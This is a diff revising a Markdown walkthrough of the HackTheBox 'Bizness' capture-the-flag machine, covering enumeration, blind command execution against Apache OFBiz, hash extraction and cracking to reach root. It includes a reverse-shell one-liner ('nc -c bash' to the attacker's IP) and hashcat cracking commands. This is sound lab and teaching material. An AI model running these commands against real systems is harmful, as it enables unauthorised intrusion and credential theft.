@@ -11,9 +11,8 @@
 
 ####
 ####
-####
 ## Open ports in target machine
-### Nmap:
+### Nmap
 After spawm machine we need to make a recognition phase, **nmap** is very hepful to discover the ports and services that is running over target machine.
 ####
 <div class="tip">
@@ -46,13 +45,12 @@ gobuster dir -u 'https://bizness.htb/' -w /usr/share/wordlists/dictionary/web-co
     - `-t` Number of tasks sent in parallel
     - `-b` Hides output for the specified status codes
     - `-k` Bypasses SSL certificate errors
-
 ####
 Gobuster reports the following: `/control (Status: 200) [Size: 34633]`.
 ####
 At first, we see an error message because it is a root directory, which itself does not show information, but inside it, there is more information. So, we could do enumeration, but this time within the `/control` directory or search online if **apache.ofbiz** has admin routes.
 ####
-```cs
+```ruby
 000000061:   200        179 L    580 W      10756 Ch    "help"                        
 000000053:   200        185 L    598 W      11060 Ch    "login"
 000000138:   200        140 L    496 W      9308  Ch    "view"
@@ -67,25 +65,30 @@ The exploit is executed as follows:
 python3 exploit.py --url https://bizness.htb --cmd 'id'
 ```
 ####
-But this vulnerability is not designed to show the output of commands in the console or browser, so the execution of commands is blind. To check if they are really being executed, we will listen with **tcpdump** on the **tun0** interface to capture *ICMP* traces.
+<div class="warning">
+
+###### Exploit Warning
+> The exploit is not designed to show the output of commands in the console or browser, so the execution of commands is blind.
+</div>
+
 ####
-```bash
+So the execution of commands is blind. To check if they are really being executed, we will listen with **tcpdump** on the **tun0** interface to capture *ICMP* traces.
+####
+```ruby
 sudo tcpdump -i tun0 icmp
 ```
 ####
 - #### Tcpdump Param
-- `-i` Specifies the interface to intercept traffic
-- `-icmp` Captures only ICMP traffic via **ping** |
+    - `-i` Specifies the interface to intercept traffic
+    - `-icmp` Captures only ICMP traffic via **ping**
 ####
 If we run the exploit as follows, we will see a connection in tcpdump:
 ####
-```perl
-Request ->
+```ruby
 python3 exploit.py --url https://bizness.htb --cmd 'ping -c 10.10.16.6'
-
-Response ->
-01:40:26.836894 IP bizness.htb > 10.10.16.6: ICMP echo request, id 8834, seq 1, length 64
-01:40:26.836922 IP 10.10.16.6 > bizness.htb: ICMP echo reply, id 8834, seq 1, length 64
+    Result ->
+        01:40:26.836894 IP bizness.htb > 10.10.16.6: ICMP echo request, id 8834, seq 1, length 64
+        01:40:26.836922 IP 10.10.16.6 > bizness.htb: ICMP echo reply, id 8834, seq 1, length 64
 ```
 ####
 ####
@@ -98,9 +101,9 @@ The machine has a very important aspect to consider: **One-liners** with **bash*
 python3 exploit.py --url https://bizness.htb --cmd 'nc -c bash 10.10.16.6 443'
 ```
 ####
-This access is not adequate because it does not give us a fully interactive shell, so we will have to treat the **tty** before proceeding with privilege escalation. This process is called: **tty treatment**.
+This access is not adequate because it does not give us a fully interactive shell, so we will have to treat the *TTY* before proceeding with privilege escalation. This process is called: *TTY treatment*.
 ####
-```bash
+```ruby
 1. script -c bash /dev/null
 2. ctrl + z
 3. stty raw -echo; fg
@@ -167,7 +170,7 @@ strings -f ./seg0/* | grep currentPassword
 ### SHA
 This new password is still not valid, so we need to look for how it is encrypted. Searching, we find the following: `/opt/ofbiz/framework/base/src/main/java/org/apache/ofbiz/base/crypto`, this directory seems to contain all the code used to encrypt the password. First, we find this:
 ####
-```java
+```Java
 private static boolean doComparePosix(String crypted, String defaultCrypt, byte[] bytes) {
     String salt = crypted.substring(typeEnd + 1, saltEnd);
     String hashed = crypted.substring(saltEnd + 1);
@@ -176,7 +179,7 @@ private static boolean doComparePosix(String crypted, String defaultCrypt, byte[
 ####
 If we translate this to **Java** code to run it:
 ####
-```java
+```Java
 public class Main {
     public static void main(String[] args) {
         String password = "$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I";
@@ -200,14 +203,14 @@ public class Main {
 ####
 This prints in the terminal:
 ####
-```perl
+```ruby
 d
 uP0_QaVBpDWFeo8-dRzDqRwXQ2I
 ```
 ####
 If we look more closely at that file, we find the following method: **encodeBase64URLSafeString**, which apparently consists of replacing the symbols: `+ /` with `- _`. So, if in the previous code at line 12 we add a `replace`, we should get a much cleaner hash:
 ####
-```python3
+```ruby
 String hashed = crypted.substring(saltEnd + 1).replace("_", "/").replace("-", "+");
 ```
 ####
@@ -232,12 +235,12 @@ We could try to crack it, but remember it is missing the **salt**, which we disc
 ####
 The final step is to use hashcat to try to crack the hash:
 ####
-```bash
+```ruby
 hashcat -a 0 -m 120 hash /usr/share/wordlists/dictionary/rockyou.txt
 ```
 ####
 - ##### Hashcat Param
-- `-a` Specifies brute force attacks
-- `-m` Specifies the mode to use to crack the hash
+    - `-a` Specifies brute force attacks
+    - `-m` Specifies the mode to use to crack the hash
 ####
 The password for the **root** user is: `monkeybizness`.
